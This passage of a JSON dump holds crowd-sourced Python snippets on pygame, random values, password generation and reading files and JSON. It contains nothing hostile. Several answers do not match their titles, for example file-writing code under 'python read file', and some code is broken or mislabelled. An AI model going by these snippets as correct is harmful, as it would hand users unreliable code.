pygame.image.load('Graphics/gamestart.png') text_surface = test_font.render('Press enter to play!', True, 'Green') StartButton2 = pygame.image.load('Graphics/STARTAS2.png') class Game:     def __init__(self):         self.screen = pygame.display.set_mode((800, 400))         self.position = (100, 70)         self.size = (325,125)         self.rect = pygame.Rect(self.position, self.size)         self.color = pygame.Color(\"red\")         pygame.display.set_caption('Amogus Adventures')      def run(self):         FPS = 60         clock = pygame.time.Clock()              while True:             for event in pygame.event.get():                 if event.type == pygame.QUIT:                     pygame.quit()                     sys.exit()               mouse_position = pygame.mouse.get_pos()             left_button,_,_ = pygame.mouse.get_pressed()             if self.rect.collidepoint(mouse_position) and left_button:                 # Clicked, do your code, start your game                 print('clicked')                                  pygame.draw.rect(self.screen, pygame.Color(\"green\"), self.rect)             else:                 # Not clicked, do normal stuff                 pygame.draw.rect(self.screen, pygame.Color(\"red\"), self.rect)               clock.tick(FPS)             pygame.display.update()              screen.blit(GameStart,(0,0))             screen.blit(StartButton,(0,0))             screen.blit(text_surface,(115,25))              if __name__ == '__main__':     pygame.init()     Game().run()\npip install pygame  And import the library.  import pygame  \nPygame is a good choice for creating GUI and game dev. Install: Windows: pip install pygame\n__code-examples__python__python_pygame__?\n 1 # Simple pygame program  2   3 # Import and initialize the pygame library  4 import pygame  5 pygame.init()  6   7 # Set up the drawing window  8 screen = pygame.display.set_mode([500, 500])  9  10 # Run until the user asks to quit 11 running = True 12 while running: 13  14     # Did the user click the window close button? 15     for event in pygame.event.get(): 16         if event.type == pygame.QUIT: 17             running = False 18  19     # Fill the background with white 20     screen.fill((255, 255, 255)) 21  22     # Draw a solid blue circle in the center 23     pygame.draw.circle(screen, (0, 0, 255), (250, 250), 75) 24  25     # Flip the display 26     pygame.display.flip() 27  28 # Done! Time to quit. 29 pygame.quit() \n# Be sure to install pygame via pip  import pygame import sys  # initialize it pygame.init()  # configurations frames_per_second = 30 window_height = 600 window_width = 400  # colors WHITE = (255, 255, 255) BLACK = (0, 0, 0) BLUE = (0, 0, 255)  # creating window display = pygame.display.set_mode((window_width, window_height))  # creating our frame regulator clock = pygame.time.Clock()  # forever loop while True:   # frame clock ticking   clock.tick(frames_per_second)      # frame Drawing   display.fill(WHITE)      # event loop   for event in pygame.event.get():     if event.type == pygame.QUIT:       pygame.quit()       sys.exit()       \n# Pygame boiler plate # Should have a red square on screen if run # pip3 install pygame  import pygame  screen = pygame.display.set_mode((1280, 720))  running = True while running: \tscreen.fill((0, 0, 0))    \tfor event in pygame.event.get(): \t\tif event.type == pygame.QUIT: \t\t\trunning = False  \tpygame.draw.rect(screen, (255, 0, 0), ((10, 10), (50, 50)))              \tpygame.display.update()      pygame.quit() \t\nimport sys import pygame  pygame.init()      screen = pygame.display.set_mode((800, 400)) pygame.display.set_caption('Amogus Adventures') clock = pygame.time.Clock()  test_font = pygame.font.Font('Graphics/Pixeltype.ttf', 50) StartButton = pygame.image.load('Graphics/STARTAS.png') GameStart = pygame.image.load('Graphics/gamestart.png') text_surface = test_font.render('Press enter to play!', True, 'Green') StartButton2 = pygame.image.load('Graphics/STARTAS2.png') class Game:     def __init__(self):         self.screen = pygame.display.set_mode((800, 400))         self.position = (100, 70)         self.size = (325,125)         self.rect = pygame.Rect(self.position, self.size)         self.color = pygame.Color(\"red\")         pygame.display.set_caption('Amogus Adventures')      def run(self):         FPS = 60         clock = pygame.time.Clock()              while True:             for event in pygame.event.get():                 if event.type == pygame.QUIT:                     pygame.quit()                     sys.exit()               mouse_position = pygame.mouse.get_pos()             left_button,_,_ = pygame.mouse.get_pressed()             if self.rect.collidepoint(mouse_position) and left_button:                 # Clicked, do your code, start your game                 print('clicked')                                  pygame.draw.rect(self.screen, pygame.Color(\"green\"), self.rect)             else:                 # Not clicked, do normal stuff                 pygame.draw.rect(self.screen, pygame.Color(\"red\"), self.rect)               clock.tick(FPS)             pygame.display.update()              screen.blit(GameStart,(0,0))             screen.blit(StartButton,(0,0))             screen.blit(text_surface,(115,25))              if __name__ == '__main__':     pygame.init()     Game().run()\npip install pygame  And import the library.  import pygame  \nPygame is a good choice for creating GUI and game dev. Install: Windows: pip install pygame\n",
    "reg_date": "2021-10-12T11:33:55.000Z"
  },
  {
    "id": 3708,
    "keyword": null,
    "link": null,
    "title": " python pygame key input",
    "description": "if event.type == pygame.KEYDOWN:\n",
    "reg_date": "2021-10-12T11:33:55.000Z"
  },
  {
    "id": 3709,
    "keyword": null,
    "link": null,
    "title": " python pygame screen example",
    "description": "import pygame background_colour = (255,255,255) (width, height) = (300, 200) screen = pygame.display.set_mode((width, height)) pygame.display.set_caption('Tutorial 1') screen.fill(background_colour) pygame.display.flip() running = True while running:   for event in pygame.event.get():     if event.type == pygame.QUIT:       running = False\n",
    "reg_date": "2021-10-12T11:33:56.000Z"
  },
  {
    "id": 3710,
    "keyword": null,
    "link": null,
    "title": " python query mssql",
    "description": "import pyodbc server = '<server>.database.windows.net' database = '<database>' username = '<username>' password = '<password>'    driver= '{ODBC Driver 17 for SQL Server}'  with pyodbc.connect('DRIVER='+driver+';SERVER='+server+';PORT=1433;DATABASE='+database+';UID='+username+';PWD='+ password) as conn:     with conn.cursor() as cursor:         cursor.execute(\"SELECT TOP 20 pc.Name as CategoryName, p.name as ProductName FROM [SalesLT].[ProductCategory] pc JOIN [SalesLT].[Product] p ON pc.productcategoryid = p.productcategoryid\")         row = cursor.fetchone()         while row:             print (str(row[0]) + \" \" + str(row[1]))             row = cursor.fetchone() \n",
    "reg_date": "2021-10-12T11:33:56.000Z"
  },
  {
    "id": 3711,
    "keyword": null,
    "link": null,
    "title": " python querystring parse",
    "description": "from urllib.parse import urlparse, parse_qs URL='https://someurl.com/with/query_string?i=main&mode=front&sid=12ab&enc=+Hello' parsed_url = urlparse(URL) parse_qs(parsed_url.query)\n",
    "reg_date": "2021-10-12T11:33:56.000Z"
  },
  {
    "id": 3712,
    "keyword": null,
    "link": null,
    "title": " python radians to degrees",
    "description": "# The function 'degrees()' converts an angle from radians to degrees import math math.degrees(angle)\n# The function 'radians()' converts an angle from degrees to radians import math math.radians(angle)\nfrom math import degrees, pi one_radian_in_degrees = degrees(pi) # one_radian_in_degrees = 180\n",
    "reg_date": "2021-10-12T11:33:56.000Z"
  },
  {
    "id": 3713,
    "keyword": null,
    "link": null,
    "title": " python random",
    "description": "# imports random import random # randint generates a random integar between the first parameter and the second print(random.randint(1, 100))\n#import random  import random  names = ['Harry', 'John', 'Smith', 'Larry']  #print random name from names print(random.choice(names))  #print random integer in a range of numbers print(random.randint(1, 100)\nimport random  # random number 1 to 100 x = random.randrange(0, 99) x = x + 1 print(x)\n# imports random import random # randint generates a random integar between the first parameter and the second print(random.randint(1, 100)) # random generates a random real number in the interval [0, 1) print(random.random())\nfrom random import randint # Import randint from random print(randint(1,20)) # Gets random number from first parameter to the second\n# I know somebody else has made a similar thing from mine. # Just letting you know that I didn't mean to copy his idea for this code. # If you saw this, I recommend check the other answers out, too. # Hope you guys understand... from random import randint  # Prints a random number in between 1 and 1000 print(f\"Here is a random number: {randint(1, 1000)}\")\nimport random print(random.randint(0,1))\nimport random  print(random.randint(3, 9))\n",
    "reg_date": "2021-10-12T11:33:56.000Z"
  },
  {
    "id": 3714,
    "keyword": null,
    "link": null,
    "title": " python random choice from list",
    "description": "import random  #1.A single element random.choice(list)  #2.Multiple elements with replacement random.choices(list, k = 4)  #3.Multiple elements without replacement random.sample(list, 4)\nimport random names=['Mark', 'Sam', 'Henry']  #Set any array random_array_item=random.choice(names)  #Declare a variable as a random choice print(random_array_item)  #Print the random choice #Or, if you want to arrange them in any order: for j in range(names):   print(random.choice(names))\nimport random  list = [\"Item 1\", \"Item 2\", \"Item 3\"]\t\t\t# List item = random.choice(list)\t\t\t\t\t\t# Chooses from list print(item)\t\t\t\t\t# Prints choice  # From stackoverflow # Tried and tested method\nimport random  foo = ['a', 'b', 'c', 'd', 'e'] print(random.choice(foo))\nimport random list = [20, 30, 40, 50 ,60, 70, 80] sampling = random.choices(list, k=4)      # Choices with repetition sampling = random.sample(list, k=4)       # Choices without repetition\nrandom.choice(name of list)\n",
    "reg_date": "2021-10-12T11:33:56.000Z"
  },
  {
    "id": 3715,
    "keyword": null,
    "link": null,
    "title": " python random choice int",
    "description": "import random print(random.randint(10,100))    this will output somthing between 10 and 100\nfrom random import randrange print(randrange(10)) \nfrom random import randrange print(randrange(10))\n",
    "reg_date": "2021-10-12T11:33:56.000Z"
  },
  {
    "id": 3716,
    "keyword": null,
    "link": null,
    "title": " python random date between range",
    "description": "from random import randrange from datetime import timedelta  def random_date(start, end):     delta = end - start     int_delta = (delta.days * 24 * 60 * 60) + delta.seconds     random_second = randrange(int_delta)     return start + timedelta(seconds=random_second)  from datetime import datetime d1 = datetime.strptime('1/1/2008 1:30 PM', '%m/%d/%Y %I:%M %p') d2 = datetime.strptime('1/1/2009 4:50 AM', '%m/%d/%Y %I:%M %p') print(random_date(d1, d2))  \n",
    "reg_date": "2021-10-12T11:33:56.000Z"
  },
  {
    "id": 3717,
    "keyword": null,
    "link": null,
    "title": " python random dictionary",
    "description": "dict = { 'A' : 1, 'A' : 2, 'A' : 3}  random_element = random.choice(list(dict.items()) # Output = (key, value) \nrandom.choice(list(my_dict))\n",
    "reg_date": "2021-10-12T11:33:56.000Z"
  },
  {
    "id": 3718,
    "keyword": null,
    "link": null,
    "title": " python random from normal distribution",
    "description": ">>> mu, sigma = 0, 0.1 # mean and standard deviation >>> s = np.random.normal(mu, sigma, 1000) \n",
    "reg_date": "2021-10-12T11:33:56.000Z"
  },
  {
    "id": 3719,
    "keyword": null,
    "link": null,
    "title": " python random hex color",
    "description": "import random r = lambda: random.randint(0,255) print('#\u0002X\u0002X\u0002X' % (r(),r(),r()))\n",
    "reg_date": "2021-10-12T11:33:57.000Z"
  },
  {
    "id": 3720,
    "keyword": null,
    "link": null,
    "title": " python random number",
    "description": "from random import randint  print(randint(1,5))  ##Possible Outputs## #1 #2 #3 #4 #5\nfrom random import randint  print(randint(1,3))  #Possible Outputs# #1 #2 #3\nfrom random import randint  radnom_number = randint(1, 10) # generate random number from 1 to 10. including 10  print(radnom_number)  # Possible outputs # 1 # 2 # 3 # 4 # 5 # 6 # 7 # 8 # 9 # 10\nimport random   #random numbers from 1 to 10 print(random.randint(1,10)) #use of random.randint()  #random word from a list print(random.choice([\"a\",\"b\",\"c\",\"d\",\"e\"])) #use of random.choice()  #random shuffle a list random_list = [\"a\",\"b\",\"c\",\"d\",\"e\"] random.shuffle(random_list) #use of random.shuffle() print(random_list)\nimport random # Imports the random package so that the program has full access to random-based functions  start = 1 # Put your staring value here  end = 8 # Put your ending value here  number = random.randint(start, end) # Calls the randomint function of  random to generate a random number  print(number) # Prints the number that was generated above\nimport random  print(random.randrange(1,10))\n# Random number game from random import randint  print(randint(1,11))  ~~ prints answers from 1 to 10 ~~\n",
    "reg_date": "2021-10-12T11:33:57.000Z"
  },
  {
    "id": 3721,
    "keyword": null,
    "link": null,
    "title": " python random password generator",
    "description": "import string from random import * characters = string.ascii_letters + string.punctuation  + string.digits password =  \"\".join(choice(characters) for x in range(randint(8, 16))) print password \nimport random chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@&pound;$%^&*().,?0123456789'  number = input('Please enter a number of passwords.') try:     number = int(number) except:     print(\"Error, please enter a number!\")  length = input('Length of password?') try:     length = int(length) except:     print(\"Error, please enter a number!\")  print('\\nHere are your password(s):')  for pwd in range(number):   password = ''   for c in range(length):     password += random.choice(chars)   print(password)\nimport random  alph = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ\\              abcdefghijklmnopqrstuvwxyz\\              1234567890 !@#$%^&*(){}[]<>,.') out = '' for char in string:     out += random.choice(alph)      print(out)\nimport random  print(\"Welcome to your own password Generator\")  cherecters_for_Genarating_password = (\"1234567890qwertyuiopasdfghjklzxcvnmQWERTYUIOPASDFGHJKLZXCVNM*&%$#@!\") try:          TO_GENERATE = int(input(\"How many passwords you have to create:- \"))          #print(TO_GENERATE)          Length_of_password = int(input(\"What should be the lenth of your password:- \"))          print(\"So these are your passwords:- \")     #main code     for passw in range(TO_GENERATE+1):         print(\"      or\")         password = \"\"         for should_apply in range (Length_of_password):             password += random.choice(cherecters_for_Genarating_password)         print(password)          print(\"Are these passwords satisfing you Y/N\")     satisfing = str(input())              if satisfing == \"Y\" or satisfing == \"y\":         print(\"Ok sir Thanks\")     elif satisfing == \"N\" or satisfing == \"n\":         print(\"So these are your passwords Again:- \")         for passw in range(TO_GENERATE):             password = \"\"             for should_apply in range (Length_of_password):                 password += random.choice(cherecters_for_Genarating_password)             print(password)     else:         print(\"incorrect input\") except ValueError:     print(\"Incorrect input Sorry\")\nfrom tkinter import * from random import randint  root = Tk() root.title('Codemy.com - Strong Password Generator') root.iconbitmap('c:/gui/codemy.ico') root.geometry(\"500x300\")   # Generate Random Strong Password def new_rand(): \t# Clear Our Entry Box \tpw_entry.delete(0, END)  \t# Get PW Length and convert to integer \tpw_length = int(my_entry.get())  \t# create a variable to hold our password \tmy_password = ''  \t# Loop through password length \tfor x in range(pw_length): \t\tmy_password += chr(randint(33,126))  \t# Output password to the screen \tpw_entry.insert(0, my_password)   # Copy to clipboard def clipper(): \t# Clear the clipboard \troot.clipboard_clear() \t# Copy to clipboard \troot.clipboard_append(pw_entry.get())  # Label Frame lf = LabelFrame(root, text=\"How Many Characters?\") lf.pack(pady=20)  # Create Entry Box To Designate Number of Characters my_entry = Entry(lf, font=(\"Helvetica\", 24)) my_entry.pack(pady=20, padx=20)  # Create Entry Box For Our Returned Password pw_entry = Entry(root, text='', font=(\"Helvetica\", 24), bd=0, bg=\"systembuttonface\") pw_entry.pack(pady=20)  # Create a frame for our Buttons my_frame = Frame(root) my_frame.pack(pady=20)  # Create our Buttons my_button = Button(my_frame, text=\"Generate Strong Password\", command=new_rand) my_button.grid(row=0, column=0, padx=10)  clip_button = Button(my_frame, text=\"Copy To Clipboad\", command=clipper) clip_button.grid(row=0, column=1, padx=10)  root.mainloop()  \n123455\n",
    "reg_date": "2021-10-12T11:33:57.000Z"
  },
  {
    "id": 3722,
    "keyword": null,
    "link": null,
    "title": " python random randint except a number",
    "description": "import random  x = int(raw_input(\"Number(1-6): \")) # note I made x an int  while True:     y = random.randint(1, 6)     if x != y: break \n",
    "reg_date": "2021-10-12T11:33:57.000Z"
  },
  {
    "id": 3723,
    "keyword": null,
    "link": null,
    "title": " python random string",
    "description": "import random import string  def random_string_generator(str_size, allowed_chars):     return ''.join(random.choice(allowed_chars) for x in range(str_size))  chars = string.ascii_letters + string.punctuation size = 12  print(chars) print('Random String of length 12 =', random_string_generator(size, chars))\nimport random  list = [\"Item 1\", \"Item 2\", \"Item 3\"]\t\t\t# List item = random.choice(list)\t\t\t\t\t\t# Chooses from list print(item)\t\t\t\t\t# Prints choice  # From stackoverflow # Tried and tested method\nimport secrets  secrets.token_hex(nbytes=16)  # this will produce something like  # aa82d48e5bff564f3221d02194611c13\nimport string import random  length=5 #python2 randomstr = ''.join(random.sample(string.ascii_letters+string.digits,length))   #python3 randomstr = ''.join(random.choices(string.ascii_letters+string.digits,k=length))                                    \n# -random letter generator- import string var1 = string.ascii_letters  import random var2 = random.choice(string.ascii_letters) print(var2)\n''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N)) \n",
    "reg_date": "2021-10-12T11:33:57.000Z"
  },
  {
    "id": 3724,
    "keyword": null,
    "link": null,
    "title": " python random true false",
    "description": "bool(random.getrandbits(1)) #is still about twice as fast as random.choice([True, False])\n",
    "reg_date": "2021-10-12T11:33:57.000Z"
  },
  {
    "id": 3725,
    "keyword": null,
    "link": null,
    "title": " python random word",
    "description": "#First pip install random-word from random_word import RandomWords r = RandomWords()  # Return a single random word r.get_random_word() # Return list of Random words r.get_random_words() # Return Word of the day r.word_of_the_day() \n#easy random word generator import random words = (\"Rock\", \"Paper\", \"scissor\") word = random.choice(words) correct = word print(word)\nfrom RandomWordGenerator import RandomWord  # Creating a random word object rw = RandomWord(max_word_size,                 constant_word_size=True,                 include_digits=False,                 special_chars=r\"@_!#$%^&*()<>?/\\|}{~:\",                 include_special_chars=False) \nfrom RandomWordGenerator import RandomWord  rw = RandomWord(max_word_size=5,                 constant_word_size=False)  print(rw.generate()) \nOutput will be some random word like > hdsjq \nOutput will be some random word like > gw \n",
    "reg_date": "2021-10-12T11:33:57.000Z"
  },
  {
    "id": 3726,
    "keyword": null,
    "link": null,
    "title": " python randomise between 0 or 1",
    "description": "import random random.random() # Gives you a number BETWEEN 0 and 1 as a float round(random.random()) # Gives you a number EITHER 0 and 1 \nimport random random.random() # Gives you a number between 0 and 1\n",
    "reg_date": "2021-10-12T11:33:57.000Z"
  },
  {
    "id": 3727,
    "keyword": null,
    "link": null,
    "title": " python randomize list",
    "description": "import random number_list = [7, 14, 21, 28, 35, 42, 49, 56, 63, 70] print (\"Original list : \",  number_list)  random.shuffle(number_list) #shuffle method print (\"List after shuffle  : \",  number_list)\nimport random  random.shuffle(list)\nimport random  number_list = [7, 14, 21, 28, 35, 42, 49, 56, 63, 70] print(\"Original list:\", number_list)  random.shuffle(number_list) print(\"List after first shuffle:\", number_list)  random.shuffle(number_list) print(\"List after second shuffle:\", number_list)\nimport random l = list(range(5)) print(l) # [0, 1, 2, 3, 4]  lr = random.sample(l, len(l)) print(lr) # [3, 2, 4, 1, 0]  print(l) # [0, 1, 2, 3, 4] \n",
    "reg_date": "2021-10-12T11:33:57.000Z"
  },
  {
    "id": 3728,
    "keyword": null,
    "link": null,
    "title": " python randomly shuffle rows of pandas dataframe",
    "description": "# Basic syntax: df = df.sample(frac=1, random_state=1).reset_index(drop=True) # Where: #\t- frac=1 specifies returning 100% of the original rows of the  #\t\tdataframe (in random order). Change to a decimal (e.g. 0.5) if #\t\tyou want to sample say, 50% of the original rows #\t- random_state=1 sets the seed for the random number generator and #\t\tis useful to specify if you want results to be reproducible #\t- .reset_index(drop=True) specifies resetting the row index of the #\t\tshuffled dataframe\ndf = df.sample(frac=1).reset_index(drop=True)\n",
    "reg_date": "2021-10-12T11:33:57.000Z"
  },
  {
    "id": 3729,
    "keyword": null,
    "link": null,
    "title": " python range backward",
    "description": "range(100,-1,-1)\n",
    "reg_date": "2021-10-12T11:33:58.000Z"
  },
  {
    "id": 3730,
    "keyword": null,
    "link": null,
    "title": " python range for float",
    "description": ">>> import numpy as np >>> np.arange(0.0, 1.0, 0.1) array([ 0. ,  0.1,  0.2,  0.3,  0.4,  0.5,  0.6,  0.7,  0.8,  0.9])\n",
    "reg_date": "2021-10-12T11:33:58.000Z"
  },
  {
    "id": 3731,
    "keyword": null,
    "link": null,
    "title": " python read a directory to get all files in sub folders",
    "description": "import os  path =\"C:/workspace/python\" #we shall store all the file names in this list filelist = []  for root, dirs, files in os.walk(path): \tfor file in files:         #append the file name to the list \t\tfilelist.append(os.path.join(root,file))  #print all the file names for name in filelist:     print(name)\n",
    "reg_date": "2021-10-12T11:33:58.000Z"
  },
  {
    "id": 3732,
    "keyword": null,
    "link": null,
    "title": " python read all text files in directory",
    "description": "import os from re import search  arr = os.listdir() strtxt = \".txt\" for txtfile in arr:     if txtfile.__contains__(strtxt):         fileObject = open(txtfile, \"r\")         data = fileObject.read()         print(data)\nimport glob glob.glob('*.txt')\nindex_file =  open('index.txt', 'r')     for line in index_file:        .... \n",
    "reg_date": "2021-10-12T11:33:58.000Z"
  },
  {
    "id": 3733,
    "keyword": null,
    "link": null,
    "title": " python read array line by line",
    "description": "# read file in a string list with open(fileName) as f: \tlineList = f.readlines() \t\nfor i in yourArray:     print(i)\n",
    "reg_date": "2021-10-12T11:33:58.000Z"
  },
  {
    "id": 3734,
    "keyword": null,
    "link": null,
    "title": " python read csv into array",
    "description": "import csv   items = []  with open('file.csv') as csvfile:     \tcsvReader = csv.reader(csvfile)     \tfor row in csvReader:         \t\titems.append(row[0])         print(items)\n",
    "reg_date": "2021-10-12T11:33:58.000Z"
  },
  {
    "id": 3735,
    "keyword": null,
    "link": null,
    "title": " python read dictionary from file",
    "description": "import ast  with open(\"/path/to/file\", \"r\") as data:     dictionary = ast.literal_eval(data.read())\n",
    "reg_date": "2021-10-12T11:33:58.000Z"
  },
  {
    "id": 3736,
    "keyword": null,
    "link": null,
    "title": " python read each line into a list",
    "description": "with open(filename) as f:     content = f.readlines() # you may also want to remove whitespace characters like `\\n` at the end of each line content = [x.strip() for x in content] \n",
    "reg_date": "2021-10-12T11:33:58.000Z"
  },
  {
    "id": 3737,
    "keyword": null,
    "link": null,
    "title": " python read entire file as string",
    "description": "# Open a file: file file = open('my_text_file',mode='r')   # read all lines at once all_of_it = file.read()   # close the file file.close()\n",
    "reg_date": "2021-10-12T11:33:58.000Z"
  },
  {
    "id": 3738,
    "keyword": null,
    "link": null,
    "title": " python read excel index col",
    "description": "data = pd.read_excel(r'File_Path', index_col='Name_of_Index_Column')\n",
    "reg_date": "2021-10-12T11:33:58.000Z"
  },
  {
    "id": 3739,
    "keyword": null,
    "link": null,
    "title": " python read excel set index",
    "description": "data = pd.read_excel(r'File_Path', index_col='Name_of_Index_Column')\n",
    "reg_date": "2021-10-12T11:33:59.000Z"
  },
  {
    "id": 3740,
    "keyword": null,
    "link": null,
    "title": " python read file",
    "description": "file = open(\"text.txt\", \"w\")  file.write(\"Your text goes here\")  file.close()  'r' open for reading (default) 'w' open for writing, truncating the file first 'x' open for exclusive creation, failing if the file already exists 'a' open for writing, appending to the end of the file if it exists\nfile = open(&ldquo;testfile.txt&rdquo;,&rdquo;w&rdquo;)    file.write(&ldquo;Hello World&rdquo;)  file.write(&ldquo;This is our new text file&rdquo;)  file.write(&ldquo;and this is another line.&rdquo;)  file.write(&ldquo;Why? Because we can.&rdquo;)    file.close() \nwith open(\"file.txt\", \"r\") as txt_file:   return txt_file.readlines()\n# Basic syntax: with open('/path/to/filename.extension', 'open_mode') as filename:   file_data = filename.readlines()\t# Or filename.read()  # Where: #\t- open imports the file as a file object which then needs to be read #\t\twith one of the read options #\t- readlines() imports each line of the file as an element in a list #\t- read() imports the file contents as one long new-line-separated  #\t\tstring #\t- open_mode can be one of: #\t\t- \"r\" = Read which opens a file for reading (error if the file  #\t\t\tdoesn't exist) #\t\t- \"a\" = Append which opens a file for appending (creates the  #\t\t\tfile if it doesn't exist) #\t\t- \"w\" = Write which opens a file for writing (creates the file  #\t\t\tif it doesn't exist) #\t\t- \"x\" = Create which creates the specified file (returns an error #\t\t\tif the file exists) # Note, \"with open() as\" is recommended because the file is closed  #\tautomatically so you don't have to remember to use file.close()  # Basic syntax for a delimited file with multiple fields: import csv with open('/path/to/filename.extension', 'open_mode') as filename: \tfile_data = csv.reader(filename, delimiter='delimiter')     data_as_list = list(file_data) # Where: #\t- csv.reader can be used for files that use any delimiter, not just #\t\tcommas, e.g.: '\\t', '|', ';', etc. (It's a bit of a misnomer) #\t- csv.reader() returns a csv.reader object which can be iterated  #\t\tover, directly converted to a list, and etc.   # Importing data using Numpy: import numpy as np data = np.loadtxt('/path/to/filename.extension', \t\t\t\tdelimiter=',', \t# String used to separate values \t\t\t\tskiprows=2, \t# Number of rows to skip \t\t\t\tusecols=[0,2], \t# Specify which columns to read \t\t\t\tdtype=str) \t\t# The type of the resulting array  # Importing data using Pandas: import pandas as pd data = pd.read_csv('/path/to/filename.extension', \t\t\t\tnrows=5, \t\t# Number of rows of file to read \t\t\t\theader=None, \t# Row number to use as column names  \t            sep='\\t', \t\t# Delimiter to use  \t            comment='#', \t# Character to split comments \t\t\t\tna_values=[\"\"])\t# String to recognize as NA/NaN  # Note, pandas can also import excel files with pd.read_excel()\nf=open(\"Diabetes.txt\",'r') f.read()\ntxt = open('FILENAME.txt') txtread = txt.read() print(txtread) print(txt.read())\n",
    "reg_date": "2021-10-12T11:33:59.000Z"
  },
  {
    "id": 3741,
    "keyword": null,
    "link": null,
    "title": " python read file in string list",
    "description": "# read file in a string list with open(fileName) as f: \tlineList = f.readlines() \t\n",
    "reg_date": "2021-10-12T11:33:59.000Z"
  },
  {
    "id": 3742,
    "keyword": null,
    "link": null,
    "title": " python read file line by line",
    "description": "with open(\"file.txt\") as file_in:     lines = []     for line in file_in:         lines.append(line)\nwith open('file1.txt','r') as f: \tlistl=[] \tfor line in f: \t\tstrip_lines=line.strip() \t\tlistli=strip_lines.split() \t\tprint(listli) \t\tm=listl.append(listli) \tprint(listl)\nfile1 = open('myfile.txt', 'r') Lines = file1.readlines() # usage: count = 0 for line in Lines:     count += 1     print(\"Line{}: {}\".format(count, line.strip()))\n# Open the file with read only permit f = open('my_text_file.txt') # use readline() to read the first line  line = f.readline() # use the read line to read further. # If the file is not empty keep reading one line # at a time, till the file is empty while line:     # in python 2+     # print line     # in python 3 print is a builtin function, so     print(line)     # use realine() to read next line     line = f.readline() f.close() \nwith open(fname) as f:     content = f.read().splitlines() \nfile1 = open('myfile.txt', 'r')#open the file (mode read) count = 0 #used to count the lines  for line in Lines: \tline = file1.readline()#read a single line     if not line:     \tbreak     count += 1     print(\"Line{}: {}\".format(count, line))#print the lines with their number \n",
    "reg_date": "2021-10-12T11:33:59.000Z"
  },
  {
    "id": 3743,
    "keyword": null,
    "link": null,
    "title": " python read file list from directory",
    "description": "from shutil import copyfile copyfile(src, dst)\n",
    "reg_date": "2021-10-12T11:33:59.000Z"
  },
  {
    "id": 3744,
    "keyword": null,
    "link": null,
    "title": " python read file to variable",
    "description": "with open('data.txt', 'r') as file:     data = file.read().replace('\\n', '')\n",
    "reg_date": "2021-10-12T11:33:59.000Z"
  },
  {
    "id": 3745,
    "keyword": null,
    "link": null,
    "title": " python read file without newline",
    "description": "# converts read file into a list without newlines temp = file.read().splitlines()\n",
    "reg_date": "2021-10-12T11:33:59.000Z"
  },
  {
    "id": 3746,
    "keyword": null,
    "link": null,
    "title": " python read integer from stdin",
    "description": "import sys args = sys.argv print(args) # Note args[0] will always contains file name \n",
    "reg_date": "2021-10-12T11:33:59.000Z"
  },
  {
    "id": 3747,
    "keyword": null,
    "link": null,
    "title": " python read json",
    "description": "import json  with open('path_to_file/person.json') as f:   data = json.load(f)\nimport json  with open('path_to_file/person.json') as f:   data = json.load(f)  print(data)\nimport json  uglyjson = '{\"firstnam\":\"James\",\"surname\":\"Bond\",\"mobile\":[\"007-700-007\",\"001-007-007-0007\"]}'  #json.load method converts JSON string to Python Object parsed = json.loads(uglyjson)  print(json.dumps(parsed, indent=2, sort_keys=True))\nimport json  data = {\"key\": \"value\"}  with open('data.json', 'w') as jsonfile:     json.dump(data, jsonfile) \nimport json  appDict = {   'name': 'messenger',   'playstore': True,   'company': 'Facebook',   'price': 100 } app_json = json.dumps(appDict) print(app_json)\nimport json  with open('data.txt') as json_file:     data = json.load(json_file)\n",
    "reg_date": "2021-10-12T11:33:59.000Z"
  },
  {
    "id": 3748,
    "keyword": null,
    "link": null,
    "title": " python read json file",
    "description": "import json  with open('path_to_file/person.json') as f:   data = json.load(f)\nimport json  with open('path_to_file/person.json') as f:   data = json.load(f)  print(data)\nimport json  data = {\"key\": \"value\"}  with open('data.json', 'w') as jsonfile:     json.dump(data, jsonfile) \nimport json  with open('data.txt') as json_file:     data = json.load(json_file)\nimport json  with open('file_to_load.json', 'r') as file:   data = json.load(file)\nimport json varRaw =''' {     \"from\":{         \"max\" : \"xx:xx:xx:xx:xx:xx\",         \"ip\" : \"192.168.0.20\"     },     \"data\":{         \"id\":\"value\",         \"id\": \"value\",         \"id\": \"value\"     } } ''' #string to json varJson = json.loads(varRaw) #get values from json  print(varJson['from']) #output wil be: {'max': 'xx:xx:xx:xx:xx:xx', 'ip': '192.168.0.20'} print(varJson['from']['ip']) #output wil be: 192.168.0.20\n",
    "reg_date": "2021-10-12T11:33:59.000Z"
  },
  {
    "id": 3749,
    "keyword": null,
    "link": null,
    "title": " python read string between two substrings",
    "description": "import re  s = 's1Texts2' result = re.search('s1(.*)s2', s) print(result.group(1))\n",
    "reg_date": "2021-10-12T11:34:00.000Z"
  },
  {
    "id": 3750,
    "keyword": null,
    "link": null,
    "title": " python read text file into a list",
    "description": "text_file = open(\"filename.dat\", \"r\") lines = text_file.readlines() print lines print len(lines) text_file.close()\n",
    "reg_date": "2021-10-12T11:34:00.000Z"
  },
  {
    "id": 3751,
    "keyword": null,
    "link": null,
    "title": " python read text file into string",
    "description": "with open('data.txt', 'r') as file:     data = file.read().replace('\\n', '')\n",
    "reg_date": "2021-10-12T11:34:00.000Z"
  },
  {
    "id": 3752,
    "keyword": null,
    "link": null,
    "title": " python read wav metadata",
    "description": "from wavinfo import WavInfoReader  path = '../tests/test_files/A101_1.WAV'  info = WavInfoReader(path)\n",
    "reg_date": "2021-10-12T11:34:00.000Z"
  },
  {
    "id": 3753,
    "keyword": null,
    "link": null,
    "title": " python read xlsb pandas",
    "description": "import pandas as pd #with pandas version 1.0.0 and later df = pd.read_excel('path_to_file.xlsb', engine='pyxlsb')\n",
    "reg_date": "2021-10-12T11:34:00.000Z"
  },
  {
    "id": 3754,
    "keyword": null,
    "link": null,
    "title": " python read xml",
